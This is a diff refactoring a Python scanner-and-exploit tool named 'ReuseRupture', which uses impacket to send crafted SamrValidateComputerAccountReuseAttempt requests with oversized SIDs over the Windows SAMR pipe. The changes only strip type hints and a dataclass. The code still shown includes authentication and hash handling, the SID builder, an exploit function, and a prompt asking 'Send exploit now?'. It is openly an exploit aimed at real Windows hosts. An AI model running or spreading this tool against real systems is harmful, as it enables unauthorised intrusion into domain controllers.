@@ -6,13 +6,11 @@ construction from the supplied scanner and exploit scripts. The refactor only
 normalizes argument parsing, authentication handling, output, and exit codes.
 """
 
-from __future__ import annotations
 
 import argparse
 import getpass
 import json
 import sys
-from dataclasses import dataclass
 
 from impacket.dcerpc.v5 import samr, transport
 from impacket.dcerpc.v5.dtypes import BOOL, RPC_SID, ULONG
@@ -45,32 +43,32 @@ class SamrValidateComputerAccountReuseAttemptResponse(NDRCALL):
     )
 
 
-@dataclass
 class Credentials:
-    target: str
-    domain: str
-    username: str
-    password: str
-    lmhash: str = ""
-    nthash: str = ""
+    def __init__(self, target, domain, username, password, lmhash="", nthash=""):
+        self.target = target
+        self.domain = domain
+        self.username = username
+        self.password = password
+        self.lmhash = lmhash
+        self.nthash = nthash
 
 
-def parse_hashes(value: str | None) -> tuple[str, str]:
+def parse_hashes(value):
     if not value:
         return "", ""
     if ":" not in value:
         raise ValueError("--hashes must use LMHASH:NTHASH format")
-    return tuple(value.split(":", 1))  # type: ignore[return-value]
+    return tuple(value.split(":", 1))
 
 
-def build_sid(count: int) -> RPC_SID:
+def build_sid(count):
     authorities = [21] + list(range(1, count))
     sid = RPC_SID()
     sid.fromCanonical("S-1-5-" + "-".join(map(str, authorities)))
     return sid
 
 
-def build_credentials(args: argparse.Namespace) -> Credentials:
+def build_credentials(args):
     domain, username, password, address = parse_target(args.target)
     if args.domain:
         domain = args.domain
@@ -93,7 +91,7 @@ def build_credentials(args: argparse.Namespace) -> Credentials:
     )
 
 
-def samr_connection(creds: Credentials, timeout: int):
+def samr_connection(creds, timeout):
     rpc_transport = transport.DCERPCTransportFactory(
         rf"ncacn_np:{creds.target}[\pipe\samr]"
     )
@@ -108,7 +106,7 @@ def samr_connection(creds: Credentials, timeout: int):
     return dce, connect["ServerHandle"]
 
 
-def classify(status: int) -> tuple[str, str]:
+def classify(status):
     if status == STATUS_INVALID_PARAMETER:
         return "PATCHED_BEHAVIOR", "The validating helper rejected the safe 32-byte SID."
     if status == STATUS_OBJECT_NAME_INVALID:
@@ -119,7 +117,7 @@ def classify(status: int) -> tuple[str, str]:
     return "UNKNOWN", f"Unexpected NTSTATUS 0x{status:08x}; no vulnerability conclusion."
 
 
-def scan(creds: Credentials, timeout: int) -> dict[str, object]:
+def scan(creds, timeout):
     dce, server_handle = samr_connection(creds, timeout)
     request = SamrValidateComputerAccountReuseAttempt()
     request["ServerHandle"] = server_handle
@@ -138,7 +136,7 @@ def scan(creds: Credentials, timeout: int) -> dict[str, object]:
     }
 
 
-def exploit(creds: Credentials, timeout: int) -> dict[str, object]:
+def exploit(creds, timeout):
     dce, server_handle = samr_connection(creds, timeout)
     request = SamrValidateComputerAccountReuseAttempt()
     request["ServerHandle"] = server_handle
@@ -174,7 +172,7 @@ def exploit(creds: Credentials, timeout: int) -> dict[str, object]:
     }
 
 
-def print_result(result: dict[str, object], as_json: bool = False) -> None:
+def print_result(result, as_json = False):
     if as_json:
         print(json.dumps(result, sort_keys=True))
         return
@@ -190,7 +188,7 @@ def print_result(result: dict[str, object], as_json: bool = False) -> None:
         print(f"  Detail: {result['reason']}")
 
 
-def confirm_or_exit(args: argparse.Namespace) -> None:
+def confirm_or_exit(args):
     if args.yes:
         return
     answer = input("Scanner reports vulnerable behavior. Send exploit now? [y/N] ")
@@ -198,7 +196,7 @@ def confirm_or_exit(args: argparse.Namespace) -> None:
         raise SystemExit(130)
 
 
-def add_common(parser: argparse.ArgumentParser) -> None:
+def add_common(parser):
     parser.add_argument(
         "target",
         help="Impacket-style target: [[domain/]username[:password]@]<host>",
@@ -212,7 +210,7 @@ def add_common(parser: argparse.ArgumentParser) -> None:
     parser.add_argument("--verbose", action="store_true")
 
 
-def main(argv: list[str] | None = None) -> int:
+def main(argv = None):
     parser = argparse.ArgumentParser(description="ReuseRupture SAMR scanner/exploit tool")
     sub = parser.add_subparsers(dest="command", required=True)
     scan_parser = sub.add_parser("scan", help="Run the safe behavioral scanner")
